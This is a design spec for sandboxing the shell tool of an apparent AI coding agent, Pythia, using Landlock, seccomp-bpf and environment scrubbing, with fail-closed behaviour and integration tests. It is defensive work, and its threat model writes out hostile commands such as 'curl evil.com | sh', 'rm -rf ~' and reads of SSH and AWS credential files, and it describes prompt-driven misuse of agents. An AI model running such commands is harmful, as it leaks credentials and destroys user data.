# Spec — bash tool OS sandbox (SR-3a)

Status: approved (brainstorm 2026-07-11)
Slice: second vertical slice for Pythia (Go + Bubble Tea, ports-and-adapters)
Supersedes the SR-3a placeholder named in `internal/adapter/tool/bash/bash.go`.

## Problem statement

The `bash` built-in tool runs arbitrary model-issued shell commands via
`exec.CommandContext("bash", "-c", cmd)` with **no OS-level isolation**. The
only bounds today are a working directory (`cmd.Dir`, not a jail), a context
timeout, a bounded output buffer, and env passthrough. A command can:

- read anything the process user can (`~/.ssh/id_rsa`, `~/.aws/credentials`);
- write/delete anywhere (`rm -rf ~`, overwrite `~/.bashrc`);
- make arbitrary network connections (`curl evil.com | sh`, exfiltrate a secret
  it just read);
- issue any syscall (`ptrace` another process, `mount`, load kernel modules);
- inherit every environment variable of the parent, including secrets.

Because the model chooses the command from untrusted context (a prompt, a tool
result, a file it read), this is a live remote-code-execution surface, not a
theoretical one. This slice closes it with OS-enforced isolation applied at the
existing `core.Tool` boundary.

## Outcomes

A command run through the `bash` tool executes under an OS sandbox that:

1. **Filesystem** — may read broadly but may **write only** inside the
   workspace root and `/tmp`. Writing anywhere else fails with `EACCES`.
2. **Network** — has **no** network access (outbound or inbound). `socket()`
   for `AF_INET`/`AF_INET6` fails, so exfiltration and remote-payload fetches
   are impossible.
3. **Syscalls** — runs under a seccomp-bpf allowlist; dangerous syscalls
   (`ptrace`, `mount`, `kexec_load`, `bpf`, `add_key`, `unshare`, `pivot_root`,
   swap, kernel-module, and clock/reboot families) are denied.
4. **Environment** — receives only an allowlisted, minimal environment
   (`PATH`, `HOME`, `TERM`, `LANG`); no inherited secrets reach the subprocess.

The sandbox is **fail-closed**: if it cannot be established, the command does
not run.

## Scope

### In scope

- Landlock filesystem policy (read-broad, write workspace + `/tmp`).
- seccomp-bpf policy: network denial (via `socket` domain filtering) **and** a
  dangerous-syscall denylist/allowlist, in one filter.
- Environment allowlist scrubbing.
- The self-re-exec application mechanism (below) and its `cmd/pythia`
  subcommand hook.
- Fail-closed behaviour + the `PYTHIA_BASH_SANDBOX=off` debug escape hatch.
- Build-tagged Linux implementation + a non-Linux stub that refuses.
- Integration + e2e tests proving each control.
- An ADR recording the mechanism decisions and the re-exec pattern.

### Out of scope (YAGNI)

- A read-denylist for `~/.ssh`, `~/.aws`, etc. — the network denial already
  breaks the read-then-exfiltrate chain, so broad read (Codex parity) is
  acceptable. Revisit only if a concrete threat needs it.
- Per-command dynamic policy / user-configurable allowlists. Policy is fixed at
  construction, matching the existing "nothing in args can widen the bound"
  invariant (SR-5).
- macOS/Windows sandbox backends (Seatbelt, etc.). Non-Linux builds refuse.
- Resource limits beyond the existing timeout/output cap (cgroups, rlimits,
  pids) — separate hardening slice if warranted.
- Mount/pid/user namespaces or a container/gVisor runtime — heavier than the
  Landlock+seccomp baseline this slice commits to (see ADR alternatives).

## Design

### Mechanisms (all pure-Go — `CGO_ENABLED=0` static binary preserved)

| Layer      | Mechanism                                   | Policy |
|------------|---------------------------------------------|--------|
| Filesystem | Landlock (`github.com/landlock-lsm/go-landlock`) | read broad; write only workspace root + `/tmp` |
| Network    | seccomp — deny `socket(AF_INET/AF_INET6, …)` | no outbound/inbound network |
| Syscalls   | seccomp-bpf allowlist (`github.com/elastic/go-seccomp-bpf`) | deny `ptrace`, `mount`, `kexec_load`, `bpf`, `add_key`, `unshare`, `pivot_root`, module/swap/reboot families |
| Env        | allowlist scrub                             | keep `PATH`, `HOME`, `TERM`, `LANG`; drop everything else |

Both libraries are pure Go and operate via `x/sys/unix` syscalls, so the
static-binary constraint (ADR-0004-adjacent, first slice) holds. `libseccomp`
(CGO) is explicitly rejected.

### Application mechanism — self re-exec

Landlock rulesets and seccomp filters apply to the **calling** process/thread
and are inherited across `execve`. They must therefore be installed in the
child *before* it becomes `bash` — never in the parent, or Pythia itself would
be sandboxed. Go has no post-fork/pre-exec hook (the runtime cannot safely run
Go code between fork and exec), so the idiomatic pattern is **re-exec of self**:

```
pythia
  └─ exec.Command(self, "__bash-sandbox")      // parent stays unsandboxed
       └─ (child) apply env scrub
          └─ apply Landlock ruleset
             └─ apply seccomp filter (TSYNC)
                └─ syscall.Exec("bash", ["bash","-c",cmd], scrubbedEnv)
                     // Landlock + seccomp persist across execve into bash
```

- The child is Pythia re-invoked with a reserved first arg (`__bash-sandbox`).
  `cmd/pythia/main.go` detects this arg **before** loading config or starting
  the TUI, runs the sandbox-child entrypoint, and never returns to the TUI
  path.
- The command string and the resolved policy (workspace root) are passed to the
  child out-of-band (stdin pipe or a dedicated env var set only on the child's
  `exec.Cmd`), never as a shell-visible argv token.
- stdout/stderr/exit-code/timeout/truncation semantics are unchanged — the
  parent still wires the bounded buffers and the context timeout onto the child
  `exec.Cmd`, so the existing `output` envelope is preserved.

### Boundary / architecture

- All sandbox logic lives inside `internal/adapter/tool/bash`. `internal/core`
  stays stdlib-only; the dependency-rule fitness test (`internal/arch`) still
  passes. The adapter gains dependencies on `x/sys/unix`, `go-landlock`, and
  `go-seccomp-bpf`.
- The only cross-cutting change is the reserved-subcommand hook in
  `cmd/pythia/main.go`. It stays a thin dispatch to a function exported by the
  bash adapter; no sandbox logic lives in `main`.
- Build tags split the implementation:
  - `sandbox_linux.go` — real Landlock + seccomp + env scrub + re-exec child.
  - `sandbox_other.go` — stub whose apply step returns a "sandbox unsupported on
    this platform" error, so a non-Linux build **refuses** (fail-closed) unless
    the escape hatch is set.

### Fail-closed behaviour

- Default: sandbox **ON**.
- If the kernel lacks Landlock (pre-5.13) or seccomp, or the platform is
  non-Linux, `Invoke` returns an **error envelope** ("bash sandbox unavailable")
  and does **not** run the command.
- Escape hatch: `PYTHIA_BASH_SANDBOX=off` (read via existing `internal/config`)
  runs the command **without** the sandbox — for debugging only. When set, the
  tool description / a one-time log makes the unsandboxed state explicit. This
  is the single, explicit way to opt out; nothing in the model's tool args can
  trigger it (SR-5 preserved).

## Testing

Linux-gated integration tests (build tag `integration`, matching the project's
test-tier convention) asserting, through the tool's `Invoke`:

- write outside workspace (`echo x > /etc/pythia-probe`) → denied (`EACCES`),
  non-zero exit in envelope;
- write inside workspace and `/tmp` → succeeds;
- read broadly (`cat /etc/hostname`) → succeeds (read is not restricted);
- network (`curl`/a raw `socket()` probe) → denied;
- `ptrace`/`mount` probe → denied;
- env secret not visible: parent sets `SECRET=...`, `echo $SECRET` in the
  sandbox → empty;
- `PYTHIA_BASH_SANDBOX=off` → the same probes now succeed (escape works);
- kernel-unsupported / non-Linux path → fail-closed error envelope (stubbable).

e2e: a sandboxed command exercised end-to-end through the tool registry. Unit
tests for the env-allowlist filter and the policy/config plumbing. The
`internal/arch` guard runs unchanged and must stay green (core still
stdlib-only).

## Open questions

- Exact seccomp action for denied syscalls: `EPERM` (errno, lets bash continue
  and report) vs `SIGSYS`/kill (harder failure). Lean `EPERM` for network/most,
  kill for the truly-never-legitimate set — final call in the ADR.
- Landlock ABI best-effort vs strict: require a minimum ABI and fail-closed on
  older kernels, vs degrade to the best ruleset the kernel supports. Lean
  strict/fail-closed given the security goal — confirm in the ADR.
